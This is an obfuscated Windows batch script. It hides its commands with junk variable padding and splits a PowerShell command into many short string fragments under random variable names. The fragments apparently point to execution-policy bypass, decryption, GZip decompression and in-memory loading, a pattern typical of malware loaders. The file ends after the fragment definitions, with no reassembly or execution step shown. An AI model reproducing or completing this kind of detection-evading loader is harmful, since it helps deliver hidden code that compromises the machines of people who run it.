@echo off
%aDxXEfXcsAsyQghBQKmF%s%aDxXEfXcsAsyQghBQKmF%e%aDxXEfXcsAsyQghBQKmF%t%aDxXEfXcsAsyQghBQKmF%l%aDxXEfXcsAsyQghBQKmF%o%aDxXEfXcsAsyQghBQKmF%c%aDxXEfXcsAsyQghBQKmF%a%aDxXEfXcsAsyQghBQKmF%l%aDxXEfXcsAsyQghBQKmF% %aDxXEfXcsAsyQghBQKmF%e%aDxXEfXcsAsyQghBQKmF%n%aDxXEfXcsAsyQghBQKmF%a%aDxXEfXcsAsyQghBQKmF%b%aDxXEfXcsAsyQghBQKmF%l%aDxXEfXcsAsyQghBQKmF%e%aDxXEfXcsAsyQghBQKmF%d%aDxXEfXcsAsyQghBQKmF%e%aDxXEfXcsAsyQghBQKmF%l%aDxXEfXcsAsyQghBQKmF%a%aDxXEfXcsAsyQghBQKmF%y%aDxXEfXcsAsyQghBQKmF%e%aDxXEfXcsAsyQghBQKmF%d%aDxXEfXcsAsyQghBQKmF%e%aDxXEfXcsAsyQghBQKmF%x%aDxXEfXcsAsyQghBQKmF%p%aDxXEfXcsAsyQghBQKmF%a%aDxXEfXcsAsyQghBQKmF%n%aDxXEfXcsAsyQghBQKmF%s%aDxXEfXcsAsyQghBQKmF%i%aDxXEfXcsAsyQghBQKmF%o%aDxXEfXcsAsyQghBQKmF%n%aDxXEfXcsAsyQghBQKmF%
set "jBdvMvJuQqgCwQWeFOXq=s"
set "CIKtjgOxtBoQMPGquTXD=t"
set "trzcgTKIykeAhlncwspR=!jBdvMvJuQqgCwQWeFOXq!e!CIKtjgOxtBoQMPGquTXD!"
!trzcgTKIykeAhlncwspR! "xfOSBgYrLt=llAd"
!trzcgTKIykeAhlncwspR! "HvcKZdrOGP=ypas"
!trzcgTKIykeAhlncwspR! "AqdZnKaJZu=($pa"
!trzcgTKIykeAhlncwspR! "wcQAPSTsdD=en -"
!trzcgTKIykeAhlncwspR! "hZHZGbGyOh=mory"
!trzcgTKIykeAhlncwspR! "OxLczinZxE=pres"
!trzcgTKIykeAhlncwspR! "gtyzbKiAGC=rray"
!trzcgTKIykeAhlncwspR! "nTDmNyLbLB=ecur"
!trzcgTKIykeAhlncwspR! "eplDDHZzrv=;	$B"
!trzcgTKIykeAhlncwspR! "ZGIycPfsaZ=func"
!trzcgTKIykeAhlncwspR! "XzSAOnupNR=aphy"
!trzcgTKIykeAhlncwspR! "ennTrvtThY=em.S"
!trzcgTKIykeAhlncwspR! "AbpzcvFZaD=func"
!trzcgTKIykeAhlncwspR! "tloHyCegwJ=nver"
!trzcgTKIykeAhlncwspR! "SLUfIBQYxS=-joi"
!trzcgTKIykeAhlncwspR! "sjyTklNxwO=);	$"
!trzcgTKIykeAhlncwspR! "tAaiPlvobd=ZipS"
!trzcgTKIykeAhlncwspR! "KsjzGePlwS=k($p"
